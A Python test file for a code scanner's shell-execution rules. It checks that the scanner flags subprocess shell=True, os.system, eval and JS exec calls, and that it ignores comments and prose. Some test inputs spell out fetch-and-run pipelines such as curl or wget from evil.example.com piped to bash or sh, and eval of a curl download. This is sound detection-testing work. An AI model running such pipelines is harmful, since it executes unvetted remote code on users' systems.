"""Tests for shell / command execution rules."""

from veyra.rules.shell import (
    detect_curl_pipe_shell,
    detect_eval_exec,
    detect_js_exec,
    detect_os_system,
    detect_shell_eval,
    detect_subprocess_shell,
    detect_wget_pipe_shell,
)


def test_subprocess_shell_true():
    f = detect_subprocess_shell('subprocess.run("ls", shell=True)', "x.py", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_safe_subprocess_no_shell():
    f = detect_subprocess_shell('subprocess.run(["ls", "-la"])', "x.py", 1)
    assert f is None


def test_os_system():
    f = detect_os_system('os.system("whoami")', "x.py", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_eval_exec():
    f = detect_eval_exec("eval(cmd)", "x.py", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_curl_pipe_bash():
    f = detect_curl_pipe_shell("curl https://evil.example.com/install.sh | bash", "x.sh", 1)
    assert f is not None
    assert f.severity.value == "CRITICAL"


def test_wget_pipe_sh():
    f = detect_wget_pipe_shell("wget -qO- https://evil.example.com/setup.sh | sh", "x.sh", 1)
    assert f is not None
    assert f.severity.value == "CRITICAL"


def test_shell_eval():
    f = detect_shell_eval("eval $cmd", "x.sh", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_shell_eval_keeps_expansions_and_quoted_code():
    for line in ('eval "$(curl -fsSL https://x/i.sh)"', "eval '${payload}'", "eval ${cmd}", 'f"eval \'{escaped}\'"'):
        f = detect_shell_eval(line, "x.sh", 1)
        assert f is not None, line
        assert f.severity.value == "HIGH"


def test_shell_eval_ignores_prose_mentions():
    # Field noise: every non-shell hit in the Hermes tree was prose, a log
    # string, or the rule's own description ("eval executes a string").
    for line in (
        "# Dangerous: eval of a variable",
        'err = result.get("error", "eval failed")',
        '"""...after an eval that may navigate the page."""',
        'description="eval executes a string as shell code"',
        "# sh -c / bash -c / eval payloads still scan raw."
    ):
        assert detect_shell_eval(line, "x.py", 1) is None, line


def test_js_exec_shell_true():
    f = detect_js_exec('exec("ls", { shell: true })', "x.js", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_js_exec_plain():
    f = detect_js_exec('exec("ls")', "x.js", 1)
    assert f is not None
    assert f.severity.value == "MEDIUM"


def test_js_exec_keeps_qualified_child_process():
    for line, severity in (
        ('child_process.exec("npm test")', "MEDIUM"),
        ("child_process.spawn(cmd, args, { cwd })", "MEDIUM"),
        ('const { execSync } = require("child_process"); execSync("make")', "MEDIUM"),
    ):
        f = detect_js_exec(line, "x.js", 1)
        assert f is not None, line
        assert f.severity.value == severity, line


def test_js_exec_ignores_foreign_methods_and_prose():
    # Field noise (Hermes tools/): every MEDIUM hit was prose, another
    # object's method, or Python's builtin exec. None is a child_process call.
    for line in (
        'return tool_error("Use spawn (default), list, steer, or stop.")',
        "# -exec (runs in each match's directory).",
        'home = self._sandbox.process.exec("echo $HOME")',
        "pty_proc = _PtyProcessCls.spawn(pty_argv)",
        'exec(compile(request["code"], "<cell>", "exec"), GLOBALS)',
        'description="Java Runtime.exec() \u2014 shell execution"',
        "  spawn(x, y) {",
    ):
        assert detect_js_exec(line, "x.py", 1) is None, line


def test_ordinary_curl_not_shell():
    f = detect_curl_pipe_shell("curl -o data.json https://example.com/data.json", "x.sh", 1)
    assert f is None


# --- P-16: a comment that names a pipeline is not that pipeline -------------
# Field slice (`agent/ tools/ acp_adapter/ skills/`) had 5 of 15 AS-002 hits on
# full-line comments; a comment is never executed, so nothing is downloaded and
# nothing reaches a shell.
def test_comment_naming_pipeline_is_not_execution():
    for line in (
        "# Recoverable operations (git reset --hard, chmod -R 777, curl|sh) stay in",
        "# Remote content piped to Invoke-Expression \u2014 PowerShell's `curl | sh`.",
        "# ``read_secrets_file``, critical); ``curl | sh`` in READMEs is caution, not a hard block.",
        "// curl https://example.invalid/install.sh | bash",
        "    # wget -qO- https://example.invalid/setup.sh | sh",
    ):
        assert detect_curl_pipe_shell(line, "x.py", 1) is None, line
        assert detect_wget_pipe_shell(line, "x.py", 1) is None, line


def test_comment_naming_python_exec_is_not_execution():
    for line in (
        '# `os.system("launchctl bootout ...")` here bypasses it and SIGTERMs the gateway',
        "# but the identical command inside `os.system(...)` / `subprocess.run([...])` sailed through",
        "// subprocess.run(cmd, shell=True)",
    ):
        assert detect_os_system(line, "x.py", 1) is None, line
        assert detect_subprocess_shell(line, "x.py", 1) is None, line


def test_trailing_comment_does_not_hide_a_real_pipeline():
    # Only a full-line comment is skipped: code before a trailing `#` may be the
    # real pipeline, so it must stay reportable.
    f = detect_curl_pipe_shell("curl https://example.invalid/i.sh | bash  # install", "x.sh", 1)
    assert f is not None and f.severity.value == "CRITICAL"
    f = detect_os_system('os.system(cmd)  # legacy', "x.py", 1)
    assert f is not None


# P-18: a row of a signature table names a call shape; it does not make the
# call. skills_guard.py carries its own pattern list, so the label field
# "os.system() -- unguarded shell execution" matched AS-002's HIGH branch.
def test_signature_table_row_is_not_execution():
    for line in (
        '    (r\'os\\.system\\s*\\(\', "python_os_system", "high", "execution", "os.system() \u2014 unguarded shell execution"),',
        '    (r\'os\\.popen\\s*\\(\', "python_os_popen", "high", "execution", "os.popen() \u2014 shell pipe execution"),',
    ):
        assert detect_os_system(line, "skills_guard.py", 248) is None, line


def test_table_row_does_not_hide_a_real_call():
    # A real call keeps the call text outside the quotes, even on a tuple row,
    # and a two-field row stays reportable: the shape test is not a blanket
    # "starts with (" escape hatch.
    for line in (
        '("x", os.system(cmd), "y"),',
        '(r\'os\\.system\\(\', "os.system()"),',
        'os.system("whoami")',
    ):
        f = detect_os_system(line, "x.py", 1)
        assert f is not None and f.severity.value == "HIGH", line


def test_heading_naming_pipeline_is_not_execution():
    assert detect_curl_pipe_shell("## Why `curl | bash` is dangerous", "SKILL.md", 1) is None
